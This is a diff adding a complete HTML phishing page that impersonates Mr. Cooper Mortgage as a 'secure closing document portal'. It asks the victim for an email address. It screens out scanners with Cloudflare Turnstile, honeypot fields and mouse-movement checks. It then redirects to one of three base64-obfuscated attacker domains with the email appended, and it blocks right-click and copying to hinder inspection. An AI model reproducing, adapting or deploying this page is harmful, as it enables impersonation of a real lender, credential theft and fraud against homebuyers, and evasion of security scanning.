@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Mr. Cooper Mortgage Closing Portal</title>
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline' https://challenges.cloudflare.com; frame-src https://challenges.cloudflare.com; style-src 'self' 'unsafe-inline' https://cdn.jsdelivr.net;">
+  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap');
+    
+    body {
+      font-family: 'Poppins', sans-serif;
+      background: linear-gradient(135deg, #f0f9ff 0%, #e6f2ff 100%);
+    }
+    
+    .mail-icon {
+      filter: drop-shadow(0 2px 4px rgba(59, 130, 246, 0.3));
+    }
+    
+    .download-btn {
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 6px rgba(59, 130, 246, 0.2);
+      background: linear-gradient(to right, #2563eb, #1d4ed8);
+    }
+    
+    .download-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 12px rgba(59, 130, 246, 0.3);
+      background: linear-gradient(to right, #1d4ed8, #1e40af);
+    }
+    
+    .download-btn:active {
+      transform: translateY(0);
+    }
+    
+    .input-field:focus {
+      box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.2);
+      border-color: #3b82f6;
+    }
+    
+    .security-pulse {
+      animation: pulse 2s infinite;
+    }
+    
+    @keyframes pulse {
+      0% { box-shadow: 0 0 0 0 rgba(59, 130, 246, 0.4); }
+      70% { box-shadow: 0 0 0 10px rgba(59, 130, 246, 0); }
+      100% { box-shadow: 0 0 0 0 rgba(59, 130, 246, 0); }
+    }
+    
+    .info-card {
+      transition: transform 0.3s ease;
+      background: rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(10px);
+    }
+    
+    .info-card:hover {
+      transform: translateY(-5px);
+    }
+    
+    .logo-container {
+      background: linear-gradient(135deg, #1e40af 0%, #1e3a8a 100%);
+      border-radius: 16px;
+      padding: 16px;
+      box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.2);
+    }
+  </style>
+</head>
+<body class="min-h-screen flex items-center justify-center px-4 py-8" oncontextmenu="return false;">
+  <div class="bg-white rounded-2xl shadow-xl w-full max-w-5xl overflow-hidden flex flex-col md:flex-row border border-blue-100">
+    <!-- Left side - Information section -->
+    <div class="bg-gradient-to-br from-blue-600 to-blue-800 text-white p-8 md:w-1/2">
+      <div class="mb-8 flex flex-col items-center logo-container">
+        <h2 class="text-3xl font-bold mb-2 text-white">Mr. Cooper Mortgage</h2>
+        <p class="text-blue-100">America's Largest Mortgage Servicer</p>
+      </div>
+      
+      <div class="space-y-6 mb-8">
+        <div class="info-card bg-blue-700 bg-opacity-50 p-5 rounded-lg">
+          <h3 class="font-semibold text-lg mb-2 flex items-center">
+            <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+            </svg>
+            About Mr. Cooper
+          </h3>
+          <p class="text-blue-100 text-sm">Mr. Cooper is America's largest mortgage servicer, serving over 5.3 million customers with more than 25 years of experience in the mortgage industry. We're committed to making the home loan process simple and straightforward.</p>
+        </div>
+        
+        <div class="info-card bg-blue-700 bg-opacity-50 p-5 rounded-lg">
+          <h3 class="font-semibold text-lg mb-2 flex items-center">
+            <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path>
+            </svg>
+            Secure Document Portal
+          </h3>
+          <p class="text-blue-100 text-sm">Access your closing documents securely through our encrypted portal. All communications are protected with bank-level security and Cloudflare protection.</p>
+        </div>
+        
+        <div class="info-card bg-blue-700 bg-opacity-50 p-5 rounded-lg">
+          <h3 class="font-semibold text-lg mb-2 flex items-center">
+            <svg class="w-5 h-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
+            </svg>
+            Loan Services
+          </h3>
+          <p class="text-blue-100 text-sm">Mr. Cooper offers various loan types including conventional, FHA, VA, jumbo loans, and home equity loans. We provide both purchase loans and refinancing options with competitive rates.</p>
+        </div>
+      </div>
+      
+      <div class="text-blue-200 text-sm">
+        <p class="flex items-center mb-2">
+          <svg class="w-4 h-4 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
+          </svg>
+          Over 5 million customers served
+        </p>
+        <p class="flex items-center mb-2">
+          <svg class="w-4 h-4 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
+          </svg>
+          4.2-star rating on TrustPilot
+        </p>
+        <p class="flex items-center">
+          <svg class="w-4 h-4 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
+          </svg>
+          Named one of Best Mortgage Lenders of 2024 by Forbes Advisor
+        </p>
+      </div>
+    </div>
+    
+    <!-- Right side - Login form -->
+    <div class="p-8 md:w-1/2 text-center security-pulse">
+      <div class="mb-6">
+        <svg class="mx-auto h-16 w-16 text-blue-500 mail-icon" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"
+             xmlns="http://www.w3.org/2000/svg">
+          <path stroke-linecap="round" stroke-linejoin="round"
+                d="M21.75 6.75v10.5a2.25 2.25 0 01-2.25 2.25h-15a2.25 2.25 0 01-2.25-2.25V6.75m19.5 0A2.25 2.25 0 0019.5 4.5h-15a2.25 2.25 0 00-2.25 2.25m19.5 0v.243a2.25 2.25 0 01-1.07 1.916l-7.5 4.615a2.25 2.25 0 01-2.36 0L3.32 8.91a2.25 2.25 0 01-1.07-1.916V6.75">
+          </path>
+        </svg>
+        <h1 class="text-2xl font-extrabold text-gray-800 mt-2">Secure Document Portal</h1>
+        <p class="text-sm text-gray-600 mt-2">Access your mortgage closing documents</p>
+      </div>
+
+      <form id="download-form">
+        <!-- Enhanced honeypot fields -->
+        <div class="hidden" aria-hidden="true">
+          <label for="hp-phone">Phone</label>
+          <input type="text" id="hp-phone" name="phone" autocomplete="nope" tabindex="-1" />
+          <input type="checkbox" id="hp-consent" name="consent" autocomplete="off" tabindex="-1" style="display:none !important;" />
+          <input type="text" id="hp-name" name="name" autocomplete="off" tabindex="-1" style="opacity:0;position:absolute;left:-9999px;" />
+        </div>
+
+        <!-- Email input -->
+        <div class="text-left mb-4">
+          <label for="user-email" class="block text-sm font-medium text-gray-700 mb-1">Email Address</label>
+          <input
+            type="email"
+            id="user-email"
+            placeholder="user@company.com"
+            class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 input-field"
+            autocomplete="email"
+            required
+            autofocus
+          />
+        </div>
+
+        <!-- Cloudflare Turnstile widget -->
+        <div id="cf-captcha" class="mb-4 flex justify-center"></div>
+
+        <!-- Submit button -->
+        <button
+          type="submit"
+          id="download-btn"
+          class="w-full bg-blue-600 text-white py-3 rounded-lg font-medium hover:bg-blue-700 download-btn disabled:opacity-50 disabled:cursor-not-allowed"
+          disabled
+        >
+          CONTINUE
+        </button>
+
+        <div id="status" class="mt-4 text-sm text-red-500 hidden"></div>
+        <div id="success-message" class="mt-4 text-sm text-green-600 hidden">
+          <svg class="inline-block h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
+          </svg>
+          Accessing your documents now...
+        </div>
+      </form>
+
+      <footer class="mt-8 text-xs text-gray-400">
+        <div class="flex items-center justify-center mb-2">
+          <svg class="h-4 w-4 mr-1 text-blue-400" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
+            <path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"></path>
+          </svg>
+          <span>Secure Encrypted Connection</span>
+        </div>
+        &copy; 2000-2025 Mr. Cooper Group Inc. All rights reserved. Lending services provided by Mr. Cooper Mortgage.
+      </footer>
+    </div>
+  </div>
+
+  <script>
+    // Enhanced security without delays
+    (function(){
+      // Mouse movement tracking
+      var mouseMovements = [];
+      document.addEventListener('mousemove', function(e) {
+        mouseMovements.push({
+          x: e.clientX,
+          y: e.clientY,
+          t: Date.now()
+        });
+        
+        // Keep only the last 20 movements
+        if (mouseMovements.length > 20) {
+          mouseMovements.shift();
+        }
+      });
+      
+      // Keypress tracking
+      var keyPresses = [];
+      document.addEventListener('keypress', function(e) {
+        keyPresses.push({
+          key: e.key,
+          time: Date.now()
+        });
+        
+        // Keep only the last 20 keypresses
+        if (keyPresses.length > 20) {
+          keyPresses.shift();
+        }
+      });
+      
+      // Form interaction timing
+      var formViewTime = Date.now();
+      
+      // Function to check if behavior is human-like
+      function isHuman() {
+        // Check mouse movement patterns
+        if (mouseMovements.length > 5) {
+          var straightLines = 0;
+          for (var i = 2; i < mouseMovements.length; i++) {
+            var prevDeltaX = mouseMovements[i-1].x - mouseMovements[i-2].x;
+            var prevDeltaY = mouseMovements[i-1].y - mouseMovements[i-2].y;
+            var currDeltaX = mouseMovements[i].x - mouseMovements[i-1].x;
+            var currDeltaY = mouseMovements[i].y - mouseMovements[i-1].y;
+            
+            // Check if movement is in a straight line (bot-like)
+            if (Math.abs(prevDeltaX - currDeltaX) < 2 && Math.abs(prevDeltaY - currDeltaY) < 2) {
+              straightLines++;
+            }
+          }
+          
+          if (straightLines > (mouseMovements.length / 2)) {
+            return false;
+          }
+        }
+        
+        // Check if time on page is reasonable
+        var timeOnPage = Date.now() - formViewTime;
+        if (timeOnPage < 1000) {
+          return false;
+        }
+        
+        return true;
+      }
+      
+      // Function to decode base64 strings
+      function decodeBase64(s) {
+        return decodeURIComponent(escape(atob(s)));
+      }
+      
+      // Multiple redirect URLs (encoded)
+      var encodedRedirectUrls = [
+        'aHR0cHM6Ly9wemN0NjM1d29mLmt3YXlsb29tZXIucGljcy8=',
+        'aHR0cHM6Ly9iZGI5OXloaGVkLmJhdG9yYm9tZXcucGljcw==',
+        'aHR0cHM6Ly9haWVkaXVvZXUwLmRlY3RzZW50ZWMucGljcw=='
+      ];
+      
+      // Function to get a rotated URL
+      function getRedirectUrl() {
+        // Use a simple rotation based on time and user behavior
+        var now = new Date();
+        var seconds = now.getSeconds();
+        var mouseEvents = mouseMovements.length;
+        var keyEvents = keyPresses.length;
+        
+        // Create a simple hash based on time and user interactions
+        var index = (seconds + mouseEvents + keyEvents) % encodedRedirectUrls.length;
+        
+        return decodeBase64(encodedRedirectUrls[index]);
+      }
+      
+      // DOM elements
+      var elements = {
+        form: document.getElementById('download-form'),
+        status: document.getElementById('status'),
+        success: document.getElementById('success-message'),
+        button: document.getElementById('download-btn'),
+        honeypot: document.getElementById('hp-phone'),
+        email: document.getElementById('user-email')
+      };
+      
+      // Configuration
+      var config = {
+        loadTime: Date.now(),
+        widgetId: null
+      };
+      
+      // Initialize Cloudflare Turnstile
+      window.addEventListener('load', function() {
+        if (window.turnstile) {
+          config.widgetId = turnstile.render('#cf-captcha', {
+            sitekey: '0x4AAAAAABuKMwGhqGRgvrAl',
+            callback: function(token) {
+              elements.button.disabled = false;
+              elements.status.classList.add('hidden');
+            },
+            'error-callback': function() {
+              elements.button.disabled = true;
+              showError('Please complete the security check');
+            },
+            'expired-callback': function() {
+              elements.button.disabled = true;
+              showError('Security check expired, please try again');
+            }
+          });
+        }
+      });
+      
+      // Show error message
+      function showError(message) {
+        elements.success.classList.add('hidden');
+        elements.status.textContent = message;
+        elements.status.classList.remove('hidden');
+      }
+      
+      // Show success message
+      function showSuccess() {
+        elements.status.classList.add('hidden');
+        elements.success.classList.remove('hidden');
+      }
+      
+      // Form submission handler
+      elements.form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        // Enhanced bot detection
+        if (!isHuman()) {
+          showError('Please interact with the page normally');
+          return;
+        }
+        
+        // Check if honeypot fields were filled
+        if (elements.honeypot.value !== '' || document.getElementById('hp-name').value !== '') {
+          return; // Silent fail for bots
+        }
+        
+        if (elements.button.disabled) {
+          showError('Please complete the security check first');
+          return;
+        }
+        
+        var token = turnstile.getResponse(config.widgetId);
+        if (!token) {
+          showError('Please complete the security check');
+          return;
+        }
+        
+        // All checks passed
+        elements.status.classList.add('hidden');
+        showSuccess();
+        
+        // Get and encode email
+        var email = elements.email.value.trim().toLowerCase();
+        var encodedEmail = btoa(encodeURIComponent(email));
+        
+        // Get a rotated redirect URL
+        var redirectUrl = getRedirectUrl();
+        
+        // Redirect immediately without delay
+        window.location.href = redirectUrl + '?email=' + encodedEmail;
+      });
+      
+      // Additional security: prevent copying, right-click, etc.
+      document.addEventListener('contextmenu', function(e) {
+        e.preventDefault();
+        return false;
+      });
+      
+      document.addEventListener('copy', function(e) {
+        e.preventDefault();
+        return false;
+      });
+      
+      document.addEventListener('cut', function(e) {
+        e.preventDefault();
+        return false;
+      });
+      
+      document.addEventListener('paste', function(e) {
+        e.preventDefault();
+        return false;
+      });
+    })();
+  </script>
+</body>
+</html>
